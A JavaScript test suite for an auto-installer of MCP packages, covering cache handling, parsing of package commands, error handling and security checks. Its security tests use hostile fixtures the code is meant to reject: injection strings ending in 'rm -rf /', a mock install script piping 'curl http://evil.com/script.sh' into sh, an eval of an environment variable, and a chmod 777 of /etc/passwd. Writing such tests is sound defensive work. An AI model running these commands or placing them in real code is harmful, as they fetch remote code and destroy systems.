#!/usr/bin/env node

/**
 * E14Z Auto-Installation Engine - Comprehensive Test Suite
 * Tests all aspects of the auto-installation system with real scenarios
 */

const fs = require('fs').promises;
const path = require('path');
const os = require('os');
const crypto = require('crypto');

// Import all components
const { AutoInstaller } = require('./lib/execution/auto-installer');
const { SecureCacheManager } = require('./lib/execution/cache-manager');
const { PackageManagerFactory } = require('./lib/execution/package-managers');
const { ErrorHandler } = require('./lib/execution/error-handler');
const { SecureExecutor } = require('./lib/execution/sandbox');
const { EnhancedPackageVerifier } = require('./lib/execution/package-verifier');

/**
 * Test framework utilities
 */
class TestFramework {
  constructor() {
    this.testResults = [];
    this.startTime = Date.now();
    this.tempDirs = [];
  }

  async runTest(testName, testFunction) {
    console.log(`\n🧪 Running test: ${testName}`);
    const testStart = Date.now();
    
    try {
      await testFunction();
      const duration = Date.now() - testStart;
      console.log(`✅ PASSED: ${testName} (${duration}ms)`);
      this.testResults.push({ name: testName, status: 'PASSED', duration });
    } catch (error) {
      const duration = Date.now() - testStart;
      console.error(`❌ FAILED: ${testName} (${duration}ms)`);
      console.error(`   Error: ${error.message}`);
      if (process.env.VERBOSE) {
        console.error(`   Stack: ${error.stack}`);
      }
      this.testResults.push({ name: testName, status: 'FAILED', duration, error: error.message });
    }
  }

  async createTempDir(prefix = 'e14z-test-') {
    const tempDir = path.join(os.tmpdir(), prefix + Date.now() + '-' + Math.random().toString(36).substr(2, 9));
    await fs.mkdir(tempDir, { recursive: true, mode: 0o700 });
    this.tempDirs.push(tempDir);
    return tempDir;
  }

  async cleanup() {
    console.log('\n🧹 Cleaning up test resources...');
    for (const tempDir of this.tempDirs) {
      try {
        await fs.rm(tempDir, { recursive: true, force: true });
      } catch (error) {
        console.warn(`Failed to cleanup ${tempDir}: ${error.message}`);
      }
    }
  }

  printSummary() {
    const totalTests = this.testResults.length;
    const passedTests = this.testResults.filter(r => r.status === 'PASSED').length;
    const failedTests = totalTests - passedTests;
    const totalDuration = Date.now() - this.startTime;

    console.log('\n' + '='.repeat(80));
    console.log('📊 TEST SUMMARY');
    console.log('='.repeat(80));
    console.log(`Total Tests: ${totalTests}`);
    console.log(`Passed: ${passedTests} ✅`);
    console.log(`Failed: ${failedTests} ❌`);
    console.log(`Success Rate: ${((passedTests / totalTests) * 100).toFixed(1)}%`);
    console.log(`Total Duration: ${totalDuration}ms`);
    console.log('='.repeat(80));

    if (failedTests > 0) {
      console.log('\n❌ FAILED TESTS:');
      this.testResults.filter(r => r.status === 'FAILED').forEach(test => {
        console.log(`   - ${test.name}: ${test.error}`);
      });
    }

    return failedTests === 0;
  }
}

/**
 * Mock MCP data for testing
 */
const MOCK_MCPS = {
  'npm-simple': {
    name: 'Simple NPM MCP',
    slug: 'npm-simple',
    installation_methods: [{
      type: 'npm',
      command: 'npx lodash',
      description: 'Install via NPM'
    }],
    auth_method: 'none'
  },
  'npm-scoped': {
    name: 'Scoped NPM MCP',
    slug: 'npm-scoped',
    installation_methods: [{
      type: 'npm',
      command: 'npx @types/node',
      description: 'Install scoped package'
    }],
    auth_method: 'none'
  },
  'suspicious-package': {
    name: 'Suspicious MCP',
    slug: 'suspicious-package',
    installation_methods: [{
      type: 'npm',
      command: 'npx bitcoin-stealer',
      description: 'Suspicious package'
    }],
    auth_method: 'none'
  },
  'malformed-command': {
    name: 'Malformed Command MCP',
    slug: 'malformed-command',
    installation_methods: [{
      type: 'npm',
      command: 'npx test; rm -rf /',
      description: 'Command injection attempt'
    }],
    auth_method: 'none'
  },
  'python-package': {
    name: 'Python MCP',
    slug: 'python-package',
    installation_methods: [{
      type: 'pip',
      command: 'pip install requests',
      description: 'Install via Pip'
    }],
    auth_method: 'none'
  },
  'git-repo': {
    name: 'Git Repository MCP',
    slug: 'git-repo',
    installation_methods: [{
      type: 'git',
      command: 'git clone https://github.com/lodash/lodash.git',
      description: 'Clone from Git'
    }],
    auth_method: 'none'
  }
};

/**
 * Mock API server for testing
 */
class MockAPIServer {
  constructor() {
    this.mcps = { ...MOCK_MCPS };
  }

  async getMCP(slug) {
    if (this.mcps[slug]) {
      return { mcp: this.mcps[slug] };
    }
    throw new Error(`MCP not found: ${slug}`);
  }

  addMCP(slug, mcp) {
    this.mcps[slug] = mcp;
  }

  removeMCP(slug) {
    delete this.mcps[slug];
  }
}

/**
 * Comprehensive test suite
 */
class AutoInstallTestSuite {
  constructor() {
    this.framework = new TestFramework();
    this.mockAPI = new MockAPIServer();
    this.testCacheDir = null;
  }

  async setup() {
    console.log('🚀 Setting up E14Z Auto-Installation Test Suite');
    console.log('=' .repeat(80));
    
    // Create test cache directory
    this.testCacheDir = await this.framework.createTempDir('e14z-cache-');
    console.log(`Test cache directory: ${this.testCacheDir}`);
  }

  async runAllTests() {
    await this.setup();

    // Core functionality tests
    await this.framework.runTest('SecureCacheManager - Basic Operations', () => this.testCacheManagerBasics());
    await this.framework.runTest('PackageManagerFactory - Manager Selection', () => this.testPackageManagerSelection());
    await this.framework.runTest('NPM Package Manager - Parse Commands', () => this.testNPMPackageManagerParsing());
    await this.framework.runTest('Python Package Manager - Parse Commands', () => this.testPythonPackageManagerParsing());
    await this.framework.runTest('Git Package Manager - Parse Commands', () => this.testGitPackageManagerParsing());

    // Security tests
    await this.framework.runTest('Command Sanitizer - Injection Protection', () => this.testCommandSanitizer());
    await this.framework.runTest('Package Verifier - Typosquatting Detection', () => this.testTyposquattingDetection());
    await this.framework.runTest('Package Verifier - Malicious Package Detection', () => this.testMaliciousPackageDetection());
    await this.framework.runTest('Security Scanning - Suspicious Scripts', () => this.testSuspiciousScriptDetection());
    
    // Error handling tests
    await this.framework.runTest('Error Handler - Categorization', () => this.testErrorCategorization());
    await this.framework.runTest('Transaction Rollback - Installation Failure', () => this.testTransactionRollback());
    await this.framework.runTest('Retry Logic - Network Failures', () => this.testRetryLogic());

    // Cache tests
    await this.framework.runTest('Cache - Integrity Verification', () => this.testCacheIntegrity());
    await this.framework.runTest('Cache - Cleanup Policies', () => this.testCacheCleanup());
    await this.framework.runTest('Cache - Concurrent Access', () => this.testConcurrentCacheAccess());

    // Performance tests
    await this.framework.runTest('Performance - Installation Speed', () => this.testInstallationPerformance());
    await this.framework.runTest('Performance - Cache Hit Speed', () => this.testCacheHitPerformance());

    // Integration tests (these would work with real packages if network is available)
    if (process.env.NETWORK_TESTS === 'true') {
      await this.framework.runTest('Integration - Real NPM Package', () => this.testRealNPMPackage());
      await this.framework.runTest('Integration - Real Git Repository', () => this.testRealGitRepository());
    }

    // Edge case tests
    await this.framework.runTest('Edge Cases - Large Package', () => this.testLargePackage());
    await this.framework.runTest('Edge Cases - Network Timeout', () => this.testNetworkTimeout());
    await this.framework.runTest('Edge Cases - Disk Space Limit', () => this.testDiskSpaceLimit());
    await this.framework.runTest('Edge Cases - Permission Errors', () => this.testPermissionErrors());

    await this.framework.cleanup();
    return this.framework.printSummary();
  }

  // Core functionality tests

  async testCacheManagerBasics() {
    const cacheManager = new SecureCacheManager({
      cacheDir: this.testCacheDir,
      securityLevel: 'standard'
    });

    await cacheManager.initialize();

    // Test cache location generation
    const location = cacheManager.getCacheLocation('test-package', '1.0.0');
    if (!location.packageDir.includes('test-package')) {
      throw new Error('Cache location not generated correctly');
    }

    // Test caching check (should be false initially)
    const isCached = await cacheManager.isCached('test-package', '1.0.0');
    if (isCached) {
      throw new Error('Package should not be cached initially');
    }

    // Create a test file in the package directory first
    await fs.mkdir(location.packageDir, { recursive: true });
    await fs.writeFile(path.join(location.packageDir, 'package.json'), JSON.stringify({
      name: 'test-package',
      version: '1.0.0'
    }));

    // Test adding to cache
    await cacheManager.addToCache('test-package', '1.0.0', {
      installedAt: new Date().toISOString()
    }, {
      name: 'test-package',
      version: '1.0.0'
    });

    // Test cache hit
    const isCachedNow = await cacheManager.isCached('test-package', '1.0.0');
    if (!isCachedNow) {
      throw new Error('Package should be cached after adding');
    }

    // Test cache stats
    const stats = await cacheManager.getCacheStats();
    if (stats.packageCount < 1) {
      throw new Error('Cache stats should show at least 1 package');
    }
  }

  async testPackageManagerSelection() {
    const factory = new PackageManagerFactory();

    // Test NPM selection
    const npmManager = factory.getManager(MOCK_MCPS['npm-simple'], MOCK_MCPS['npm-simple'].installation_methods[0]);
    if (npmManager.type !== 'npm') {
      throw new Error('Should select NPM manager for NPM packages');
    }

    // Test Python selection
    const pipManager = factory.getManager(MOCK_MCPS['python-package'], MOCK_MCPS['python-package'].installation_methods[0]);
    if (pipManager.type !== 'pip') {
      throw new Error('Should select Pip manager for Python packages');
    }

    // Test Git selection
    const gitManager = factory.getManager(MOCK_MCPS['git-repo'], MOCK_MCPS['git-repo'].installation_methods[0]);
    if (gitManager.type !== 'git') {
      throw new Error('Should select Git manager for Git repositories');
    }
  }

  async testNPMPackageManagerParsing() {
    const factory = new PackageManagerFactory();
    const npmManager = factory.getManager(MOCK_MCPS['npm-simple'], MOCK_MCPS['npm-simple'].installation_methods[0]);

    // Test simple package parsing
    const packageInfo = npmManager.parseInstallCommand({ command: 'npx lodash' });
    if (packageInfo.name !== 'lodash' || packageInfo.version !== 'latest') {
      throw new Error(`Expected lodash@latest, got ${packageInfo.name}@${packageInfo.version}`);
    }

    // Test scoped package parsing
    const scopedInfo = npmManager.parseInstallCommand({ command: 'npx @types/node' });
    if (scopedInfo.name !== '@types/node' || scopedInfo.scope !== '@types') {
      throw new Error(`Expected @types/node with scope @types, got ${scopedInfo.name} with scope ${scopedInfo.scope}`);
    }

    // Test versioned package parsing
    const versionedInfo = npmManager.parseInstallCommand({ command: 'npx lodash@4.17.21' });
    if (versionedInfo.name !== 'lodash' || versionedInfo.version !== '4.17.21') {
      throw new Error(`Expected lodash@4.17.21, got ${versionedInfo.name}@${versionedInfo.version}`);
    }
  }

  async testPythonPackageManagerParsing() {
    const factory = new PackageManagerFactory();
    const pipManager = factory.getManager(MOCK_MCPS['python-package'], MOCK_MCPS['python-package'].installation_methods[0]);

    const packageInfo = pipManager.parseInstallCommand({ command: 'pip install requests' });
    if (packageInfo.name !== 'requests' || packageInfo.registry !== 'pypi') {
      throw new Error(`Expected requests from pypi, got ${packageInfo.name} from ${packageInfo.registry}`);
    }

    // Test versioned Python package
    const versionedInfo = pipManager.parseInstallCommand({ command: 'pip install requests==2.28.0' });
    if (versionedInfo.name !== 'requests' || versionedInfo.version !== '2.28.0') {
      throw new Error(`Expected requests==2.28.0, got ${versionedInfo.name}==${versionedInfo.version}`);
    }
  }

  async testGitPackageManagerParsing() {
    const factory = new PackageManagerFactory();
    const gitManager = factory.getManager(MOCK_MCPS['git-repo'], MOCK_MCPS['git-repo'].installation_methods[0]);

    const packageInfo = gitManager.parseInstallCommand({ command: 'git clone https://github.com/lodash/lodash.git' });
    if (packageInfo.name !== 'lodash' || packageInfo.registry !== 'git') {
      throw new Error(`Expected lodash from git, got ${packageInfo.name} from ${packageInfo.registry}`);
    }

    // Test Git with branch
    const branchInfo = gitManager.parseInstallCommand({ command: 'git clone https://github.com/lodash/lodash.git -b main' });
    if (branchInfo.branch !== 'main') {
      throw new Error(`Expected branch main, got ${branchInfo.branch}`);
    }
  }

  // Security tests

  async testCommandSanitizer() {
    const { CommandSanitizer } = require('./lib/execution/sandbox');
    const sanitizer = new CommandSanitizer();

    // Test safe command
    const safeCommand = sanitizer.sanitizeCommand('node');
    if (safeCommand !== 'node') {
      throw new Error('Safe command should pass through unchanged');
    }

    // Test dangerous command
    try {
      sanitizer.sanitizeCommand('node; rm -rf /');
      throw new Error('Should have rejected command with injection');
    } catch (error) {
      if (!error.message.includes('Dangerous pattern')) {
        throw new Error(`Should reject with dangerous pattern error, got: ${error.message}`);
      }
    }

    // Test safe arguments
    const safeArgs = sanitizer.sanitizeArgs(['--version', '--help']);
    if (safeArgs.length !== 2) {
      throw new Error('Safe arguments should pass through');
    }

    // Test dangerous arguments
    try {
      sanitizer.sanitizeArgs(['--version', '; rm -rf /']);
      throw new Error('Should have rejected dangerous arguments');
    } catch (error) {
      if (!error.message.includes('Dangerous pattern') && !error.message.includes('Dangerous character')) {
        throw new Error(`Should reject with dangerous pattern or character error, got: ${error.message}`);
      }
    }
  }

  async testTyposquattingDetection() {
    const { PackageReputationDB } = require('./lib/execution/package-verifier');
    const reputationDB = new PackageReputationDB();

    // Test exact match (no typosquatting)
    const exactMatch = reputationDB.detectTyposquatting('express');
    if (exactMatch.detected) {
      throw new Error(`Exact match should not be flagged as typosquatting. Got: ${JSON.stringify(exactMatch)}`);
    }

    // Test typosquatting detection
    const typoSquat = reputationDB.detectTyposquatting('expresss'); // extra 's'
    if (!typoSquat.detected || typoSquat.target !== 'express') {
      throw new Error('Should detect typosquatting of express');
    }

    // Test character swap
    const charSwap = reputationDB.detectTyposquatting('exrpess'); // swapped 'r' and 'p'
    if (!charSwap.detected || charSwap.method !== 'character_swap') {
      throw new Error('Should detect character swap typosquatting');
    }
  }

  async testMaliciousPackageDetection() {
    const { PackageReputationDB } = require('./lib/execution/package-verifier');
    const reputationDB = new PackageReputationDB();

    // Test known malicious package
    const isMalicious = reputationDB.isMalicious('discord.js-selfbot');
    if (!isMalicious) {
      throw new Error('Should detect known malicious package');
    }

    // Test safe package
    const isSafe = reputationDB.isMalicious('express');
    if (isSafe) {
      throw new Error('Should not flag safe package as malicious');
    }

    // Test trusted publisher
    const isTrusted = reputationDB.isTrustedPublisher('@types/node');
    if (!isTrusted) {
      throw new Error('Should recognize @types as trusted publisher');
    }
  }

  async testSuspiciousScriptDetection() {
    const { EnhancedPackageVerifier } = require('./lib/execution/package-verifier');
    const verifier = new EnhancedPackageVerifier();

    const suspiciousPackage = {
      name: 'suspicious-test',
      scripts: {
        postinstall: 'curl http://evil.com/script.sh | sh',
        preinstall: 'rm -rf /',
        test: 'eval(process.env.MALICIOUS_CODE)'
      }
    };

    const result = { threats: [], warnings: [], score: 100 };
    await verifier.analyzeScripts(suspiciousPackage, result);

    if (result.threats.length === 0) {
      throw new Error('Should detect suspicious scripts');
    }

    const hasPipeToShell = result.threats.some(t => t.message.includes('curl') && t.message.includes('sh'));
    const hasDangerousRM = result.threats.some(t => t.message.includes('rm -rf'));
    const hasEval = result.threats.some(t => t.message.includes('eval'));

    if (!hasPipeToShell || !hasDangerousRM || !hasEval) {
      throw new Error('Should detect all types of suspicious scripts');
    }
  }

  // Error handling tests

  async testErrorCategorization() {
    const { ErrorHandler } = require('./lib/execution/error-handler');
    const errorHandler = new ErrorHandler();

    // Test network error
    const networkError = new Error('ENOTFOUND example.com');
    const categorizedNetwork = errorHandler.categorizeError(networkError);
    if (categorizedNetwork.category !== 'network' || !categorizedNetwork.recoverable) {
      throw new Error('Should categorize network errors correctly');
    }

    // Test permission error
    const permissionError = new Error('EACCES: permission denied');
    const categorizedPermission = errorHandler.categorizeError(permissionError);
    if (categorizedPermission.category !== 'permission' || !categorizedPermission.recoverable) {
      throw new Error('Should categorize permission errors correctly');
    }

    // Test security error
    const securityError = new Error('Package quarantined due to security threats');
    const categorizedSecurity = errorHandler.categorizeError(securityError);
    if (categorizedSecurity.category !== 'security' || categorizedSecurity.recoverable) {
      throw new Error('Should categorize security errors as non-recoverable');
    }
  }

  async testTransactionRollback() {
    const cacheManager = new SecureCacheManager({
      cacheDir: await this.framework.createTempDir('rollback-test-')
    });
    await cacheManager.initialize();

    const { InstallationTransaction } = require('./lib/execution/error-handler');
    const transaction = new InstallationTransaction('test-package', '1.0.0', cacheManager);

    // Simulate some operations
    const testFile = path.join(this.testCacheDir, 'test-rollback-file.txt');
    await fs.writeFile(testFile, 'test content');
    transaction.recordOperation('file_created', { path: testFile });

    const testDir = path.join(this.testCacheDir, 'test-rollback-dir');
    await fs.mkdir(testDir);
    transaction.recordOperation('directory_created', { path: testDir });

    // Test rollback
    const rollbackResult = await transaction.rollback();
    if (!rollbackResult.success) {
      throw new Error('Rollback should succeed');
    }

    // Verify files are cleaned up
    try {
      await fs.access(testFile);
      throw new Error('File should be removed after rollback');
    } catch (error) {
      if (error.code !== 'ENOENT') {
        throw error;
      }
    }
  }

  async testRetryLogic() {
    const { ErrorHandler } = require('./lib/execution/error-handler');
    const errorHandler = new ErrorHandler({ maxRetries: 3, retryDelay: 10 });

    let attemptCount = 0;
    const flakyOperation = async () => {
      attemptCount++;
      if (attemptCount < 3) {
        throw new Error('ENOTFOUND temporary.network.error');
      }
      return 'success';
    };

    const result = await errorHandler.executeWithRetry(flakyOperation);
    if (result !== 'success' || attemptCount !== 3) {
      throw new Error(`Expected 3 attempts and success, got ${attemptCount} attempts and ${result}`);
    }
  }

  // Cache tests

  async testCacheIntegrity() {
    const cacheManager = new SecureCacheManager({
      cacheDir: await this.framework.createTempDir('integrity-test-'),
      enableIntegrityChecks: true
    });
    await cacheManager.initialize();

    // Create a test file in the package directory first
    const location = cacheManager.getCacheLocation('integrity-test', '1.0.0');
    await fs.mkdir(location.packageDir, { recursive: true });
    await fs.writeFile(path.join(location.packageDir, 'test.txt'), 'original content');

    // Add package to cache
    await cacheManager.addToCache('integrity-test', '1.0.0', {}, { name: 'integrity-test' });

    // Verify integrity initially passes
    const isValid = await cacheManager.verifyIntegrity(location);
    if (!isValid) {
      throw new Error('Integrity should be valid initially');
    }

    // Corrupt a file and test integrity failure
    const testFile = path.join(location.packageDir, 'test.txt');
    
    // Corrupt the file (it already exists from setup)
    await fs.writeFile(testFile, 'corrupted content');
    
    // Verify integrity now fails
    const isValidAfterCorruption = await cacheManager.verifyIntegrity(location);
    if (isValidAfterCorruption) {
      throw new Error('Integrity should fail after corruption');
    }
  }

  async testCacheCleanup() {
    const cacheManager = new SecureCacheManager({
      cacheDir: await this.framework.createTempDir('cleanup-test-'),
      maxCacheAge: 100, // 100ms for testing
      maxCacheSize: 1024 // 1KB for testing
    });
    await cacheManager.initialize();

    // Add multiple packages
    await cacheManager.addToCache('old-package', '1.0.0', {}, { name: 'old-package' });
    await cacheManager.addToCache('new-package', '1.0.0', {}, { name: 'new-package' });

    // Wait for age limit
    await new Promise(resolve => setTimeout(resolve, 150));

    // Test cleanup
    const cleanupResult = await cacheManager.cleanup({ force: true });
    if (cleanupResult.cleaned < 1) {
      throw new Error('Cleanup should remove at least one package');
    }
  }

  async testConcurrentCacheAccess() {
    const cacheManager = new SecureCacheManager({
      cacheDir: await this.framework.createTempDir('concurrent-test-')
    });
    await cacheManager.initialize();

    // Test concurrent additions (should handle locking)
    const promises = [];
    for (let i = 0; i < 5; i++) {
      promises.push(cacheManager.addToCache(`concurrent-${i}`, '1.0.0', {}, { name: `concurrent-${i}` }));
    }

    await Promise.all(promises);

    // Verify all packages were added
    const stats = await cacheManager.getCacheStats();
    if (stats.packageCount < 5) {
      throw new Error(`Expected at least 5 packages, got ${stats.packageCount}`);
    }
  }

  // Performance tests

  async testInstallationPerformance() {
    const autoInstaller = new AutoInstaller({
      cacheDir: await this.framework.createTempDir('performance-test-'),
      apiUrl: 'mock://test'
    });

    // Mock the getMCPDetails method
    autoInstaller.getMCPDetails = async (slug) => {
      return MOCK_MCPS[slug] || { error: 'Not found' };
    };

    const startTime = Date.now();
    
    // This would normally install a real package, but we're testing the infrastructure
    try {
      await autoInstaller.canAutoInstall('npm-simple');
      const duration = Date.now() - startTime;
      
      if (duration > 5000) { // 5 seconds
        throw new Error(`Installation analysis took too long: ${duration}ms`);
      }
    } catch (error) {
      // Expected to fail since we're not actually installing
      if (!error.message.includes('Failed to install')) {
        throw error;
      }
    }
  }

  async testCacheHitPerformance() {
    const cacheManager = new SecureCacheManager({
      cacheDir: await this.framework.createTempDir('cache-hit-test-')
    });
    await cacheManager.initialize();

    // Create a test file in the package directory first
    const location = cacheManager.getCacheLocation('performance-test', '1.0.0');
    await fs.mkdir(location.packageDir, { recursive: true });
    await fs.writeFile(path.join(location.packageDir, 'package.json'), JSON.stringify({
      name: 'performance-test',
      version: '1.0.0'
    }));

    // Add package to cache
    await cacheManager.addToCache('performance-test', '1.0.0', {}, { name: 'performance-test' });

    // Test cache hit performance
    const startTime = Date.now();
    const isCached = await cacheManager.isCached('performance-test', '1.0.0');
    const duration = Date.now() - startTime;

    if (!isCached) {
      throw new Error('Package should be cached');
    }

    if (duration > 100) { // 100ms
      throw new Error(`Cache hit took too long: ${duration}ms`);
    }
  }

  // Integration tests (only run if NETWORK_TESTS=true)

  async testRealNPMPackage() {
    if (!process.env.NETWORK_TESTS) {
      console.log('   Skipping network test (set NETWORK_TESTS=true to enable)');
      return;
    }

    const autoInstaller = new AutoInstaller({
      cacheDir: await this.framework.createTempDir('real-npm-test-'),
      timeout: 60000
    });

    // Try to install a real, small NPM package
    try {
      const result = await autoInstaller.installAndRun('lodash', {
        timeout: 60000
      });
      
      if (!result.success && !result.error.includes('Failed to fetch MCP details')) {
        throw new Error(`Unexpected error: ${result.error}`);
      }
    } catch (error) {
      // Expected to fail since lodash isn't in our MCP registry
      if (!error.message.includes('Failed to get MCP details')) {
        throw error;
      }
    }
  }

  async testRealGitRepository() {
    if (!process.env.NETWORK_TESTS) {
      console.log('   Skipping network test (set NETWORK_TESTS=true to enable)');
      return;
    }

    const { GitPackageManager } = require('./lib/execution/package-managers');
    const gitManager = new GitPackageManager();

    const testDir = await this.framework.createTempDir('git-test-');
    
    try {
      // Test with a small, public repository
      await gitManager.install({
        name: 'test-repo',
        repositoryUrl: 'https://github.com/octocat/Hello-World.git',
        branch: 'master'
      }, testDir);

      // Verify the repository was cloned
      const repoDir = path.join(testDir, 'repo');
      const readmeExists = await fs.access(path.join(repoDir, 'README')).then(() => true).catch(() => false);
      
      if (!readmeExists) {
        throw new Error('Repository should have been cloned');
      }
    } catch (error) {
      if (error.message.includes('git clone failed')) {
        console.log('   Git clone failed (may be network/git availability issue)');
        return; // Don't fail the test for network issues
      }
      throw error;
    }
  }

  // Edge case tests

  async testLargePackage() {
    const { EnhancedPackageVerifier } = require('./lib/execution/package-verifier');
    const verifier = new EnhancedPackageVerifier({ maxPackageSize: 1024 }); // 1KB limit

    const largePackageMetadata = {
      name: 'large-package',
      size: 2048 // 2KB, exceeds limit
    };

    const result = { threats: [], warnings: [], score: 100 };
    await verifier.validateBasicInfo({}, largePackageMetadata, result);

    const hasOversizeWarning = result.threats.some(t => t.type === 'oversized_package');
    if (!hasOversizeWarning) {
      throw new Error('Should detect oversized packages');
    }
  }

  async testNetworkTimeout() {
    const { ErrorHandler } = require('./lib/execution/error-handler');
    const errorHandler = new ErrorHandler();

    const timeoutError = new Error('Command timed out after 30000ms');
    const categorized = errorHandler.categorizeError(timeoutError);

    if (categorized.category !== 'timeout' || !categorized.recoverable) {
      throw new Error('Should categorize timeout errors correctly');
    }
  }

  async testDiskSpaceLimit() {
    const { ErrorHandler } = require('./lib/execution/error-handler');
    const errorHandler = new ErrorHandler();

    const diskSpaceError = new Error('ENOSPC: no space left on device');
    const categorized = errorHandler.categorizeError(diskSpaceError);

    if (categorized.category !== 'disk_space' || !categorized.recoverable) {
      throw new Error('Should categorize disk space errors correctly');
    }

    if (!categorized.suggestions.some(s => s.includes('disk space'))) {
      throw new Error('Should provide disk space suggestions');
    }
  }

  async testPermissionErrors() {
    const { SecureExecutor } = require('./lib/execution/sandbox');
    const executor = new SecureExecutor();

    try {
      // Try to execute a command that should fail with permissions
      const result = await executor.execute('chmod', ['777', '/etc/passwd'], {
        timeout: 1000
      });
      
      // If command executed, it should have failed (non-zero exit code)
      if (result.code === 0) {
        throw new Error('Dangerous command should not succeed');
      }
      
      // Command ran but failed - this is acceptable for security
      return;
      
    } catch (error) {
      // Also acceptable - command was blocked entirely
      if (error.message.includes('Dangerous pattern') || 
          error.message.includes('permission') ||
          error.message.includes('EACCES')) {
        return; // Test passed
      }
      throw new Error(`Unexpected error type: ${error.message}`);
    }
  }
}

/**
 * Main test runner
 */
async function main() {
  const testSuite = new AutoInstallTestSuite();
  
  try {
    const success = await testSuite.runAllTests();
    process.exit(success ? 0 : 1);
  } catch (error) {
    console.error('\n💥 Test suite crashed:', error.message);
    if (process.env.VERBOSE) {
      console.error(error.stack);
    }
    process.exit(1);
  }
}

// CLI handling
if (require.main === module) {
  const args = process.argv.slice(2);
  
  if (args.includes('--help') || args.includes('-h')) {
    console.log('E14Z Auto-Installation Engine - Comprehensive Test Suite');
    console.log('');
    console.log('Usage: node comprehensive_test_suite.js [options]');
    console.log('');
    console.log('Options:');
    console.log('  --help, -h           Show this help message');
    console.log('  --verbose            Show detailed error stacks');
    console.log('');
    console.log('Environment Variables:');
    console.log('  NETWORK_TESTS=true   Enable tests that require network access');
    console.log('  VERBOSE=true         Show detailed error stacks');
    process.exit(0);
  }
  
  if (args.includes('--verbose')) {
    process.env.VERBOSE = 'true';
  }
  
  main();
}